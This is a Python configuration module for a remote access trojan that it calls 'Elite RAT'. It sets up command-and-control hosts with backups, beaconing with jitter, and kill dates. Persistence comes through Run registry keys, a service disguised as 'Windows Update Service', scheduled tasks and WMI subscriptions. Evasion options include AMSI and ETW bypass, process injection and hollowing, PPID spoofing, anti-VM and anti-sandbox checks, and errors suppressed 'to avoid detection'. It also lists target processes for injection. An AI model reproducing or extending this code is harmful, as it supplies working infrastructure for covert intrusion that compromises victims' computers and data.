#!/usr/bin/env python3
"""
Elite RAT Configuration System
Centralizes all configuration to avoid hardcoded values
"""

import os
import json
from typing import Dict, Any

class EliteConfig:
    """Centralized configuration management"""
    
    # Default configuration
    DEFAULT_CONFIG = {
        # C2 Settings
        "c2": {
            "primary_host": os.environ.get("C2_HOST", "localhost"),
            "primary_port": int(os.environ.get("C2_PORT", 5000)),
            "backup_hosts": os.environ.get("C2_BACKUP", "").split(","),
            "protocol": os.environ.get("C2_PROTOCOL", "https"),
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "timeout": 30,
            "retry_count": 3,
            "retry_delay": 5
        },
        
        # Security Settings
        "security": {
            "encryption_key": os.environ.get("ENCRYPT_KEY", None),
            "obfuscation_enabled": True,
            "anti_debug": True,
            "anti_vm": True,
            "anti_sandbox": True,
            "ssl_verify": False
        },
        
        # Persistence Settings
        "persistence": {
            "registry_key": r"Software\Microsoft\Windows\CurrentVersion\Run",
            "service_name": "WindowsUpdateService",
            "service_display": "Windows Update Service",
            "scheduled_task": "SystemMaintenance",
            "startup_folder": True,
            "wmi_subscription": True
        },
        
        # Operational Settings
        "operation": {
            "beacon_interval": 60,  # seconds
            "jitter": 20,  # percentage
            "working_hours_only": False,
            "working_hours_start": 9,
            "working_hours_end": 17,
            "kill_date": None,
            "max_failed_checkins": 10
        },
        
        # File Paths
        "paths": {
            "payload_dir": os.path.join(os.path.expanduser("~"), ".cache", "system"),
            "log_file": os.path.join(os.path.expanduser("~"), ".cache", "system.log"),
            "config_file": os.path.join(os.path.expanduser("~"), ".cache", "config.dat"),
            "temp_dir": os.environ.get("TEMP", "/tmp")
        },
        
        # Network Settings
        "network": {
            "proxy_enabled": False,
            "proxy_host": None,
            "proxy_port": None,
            "proxy_auth": False,
            "proxy_user": None,
            "proxy_pass": None,
            "dns_servers": ["8.8.8.8", "1.1.1.1"],
            "domain_fronting": False,
            "cdn_host": None
        },
        
        # Evasion Settings
        "evasion": {
            "process_injection": True,
            "process_hollowing": True,
            "ppid_spoofing": True,
            "etw_bypass": True,
            "amsi_bypass": True,
            "dll_unhooking": True,
            "direct_syscalls": True,
            "sleep_mask": True
        },
        
        # Target Processes for Injection
        "targets": {
            "injection_targets": [
                "explorer.exe",
                "svchost.exe",
                "notepad.exe",
                "chrome.exe",
                "firefox.exe"
            ],
            "avoid_processes": [
                "csrss.exe",
                "winlogon.exe",
                "services.exe",
                "lsass.exe"
            ]
        }
    }
    
    def __init__(self, config_file: str = None):
        """Initialize configuration"""
        self.config = self.DEFAULT_CONFIG.copy()
        self.config_file = config_file
        
        # Load from file if exists
        if config_file and os.path.exists(config_file):
            self.load_from_file(config_file)
        
        # Override with environment variables
        self.load_from_env()
    
    def load_from_file(self, filepath: str):
        """Load configuration from JSON file"""
        try:
            with open(filepath, 'r') as f:
                custom_config = json.load(f)
                self.merge_config(custom_config)
        except Exception as e:
            pass  # Silently fail to avoid detection
    
    def load_from_env(self):
        """Load configuration from environment variables"""
        env_mappings = {
            "ELITE_C2_HOST": ["c2", "primary_host"],
            "ELITE_C2_PORT": ["c2", "primary_port"],
            "ELITE_BEACON": ["operation", "beacon_interval"],
            "ELITE_ENCRYPTION": ["security", "encryption_key"],
            "ELITE_PROXY": ["network", "proxy_host"]
        }
        
        for env_var, config_path in env_mappings.items():
            value = os.environ.get(env_var)
            if value:
                self.set_nested(config_path, value)
    
    def merge_config(self, custom: Dict[str, Any]):
        """Merge custom configuration with default"""
        def merge_dict(base, custom):
            for key, value in custom.items():
                if key in base and isinstance(base[key], dict) and isinstance(value, dict):
                    merge_dict(base[key], value)
                else:
                    base[key] = value
        
        merge_dict(self.config, custom)
    
    def get(self, path: str, default=None):
        """Get configuration value by path (e.g., 'c2.primary_host')"""
        try:
            keys = path.split('.')
            value = self.config
            for key in keys:
                value = value[key]
            return value
        except (KeyError, TypeError):
            return default
    
    def set_nested(self, path: list, value):
        """Set nested configuration value"""
        current = self.config
        for key in path[:-1]:
            if key not in current:
                current[key] = {}
            current = current[key]
        current[path[-1]] = value
    
    def get_c2_url(self) -> str:
        """Get full C2 URL"""
        protocol = self.get('c2.protocol', 'https')
        host = self.get('c2.primary_host', 'localhost')
        port = self.get('c2.primary_port', 5000)
        
        if (protocol == 'https' and port == 443) or (protocol == 'http' and port == 80):
            return f"{protocol}://{host}"
        else:
            return f"{protocol}://{host}:{port}"
    
    def get_backup_c2s(self) -> list:
        """Get list of backup C2 servers"""
        backups = self.get('c2.backup_hosts', [])
        protocol = self.get('c2.protocol', 'https')
        
        urls = []
        for host in backups:
            if host and host.strip():
                if '://' in host:
                    urls.append(host)
                else:
                    urls.append(f"{protocol}://{host}")
        
        return urls
    
    def should_operate(self) -> bool:
        """Check if should operate based on working hours and kill date"""
        import datetime
        
        # Check kill date
        kill_date = self.get('operation.kill_date')
        if kill_date:
            try:
                kill_dt = datetime.datetime.fromisoformat(kill_date)
                if datetime.datetime.now() > kill_dt:
                    return False
            except:
                pass
        
        # Check working hours
        if self.get('operation.working_hours_only', False):
            current_hour = datetime.datetime.now().hour
            start = self.get('operation.working_hours_start', 9)
            end = self.get('operation.working_hours_end', 17)
            
            if not (start <= current_hour < end):
                return False
        
        return True
    
    def get_beacon_interval(self) -> int:
        """Get beacon interval with jitter"""
        import random
        
        base_interval = self.get('operation.beacon_interval', 60)
        jitter = self.get('operation.jitter', 20)
        
        if jitter > 0:
            variance = int(base_interval * (jitter / 100))
            return base_interval + random.randint(-variance, variance)
        
        return base_interval
    
    def save_to_file(self, filepath: str = None):
        """Save configuration to file"""
        filepath = filepath or self.config_file
        if filepath:
            try:
                with open(filepath, 'w') as f:
                    json.dump(self.config, f, indent=2)
            except:
                pass  # Silently fail

# Global configuration instance
_global_config = None

def get_config() -> EliteConfig:
    """Get global configuration instance"""
    global _global_config
    if _global_config is None:
        _global_config = EliteConfig()
    return _global_config

def init_config(config_file: str = None):
    """Initialize global configuration"""
    global _global_config
    _global_config = EliteConfig(config_file)
    return _global_config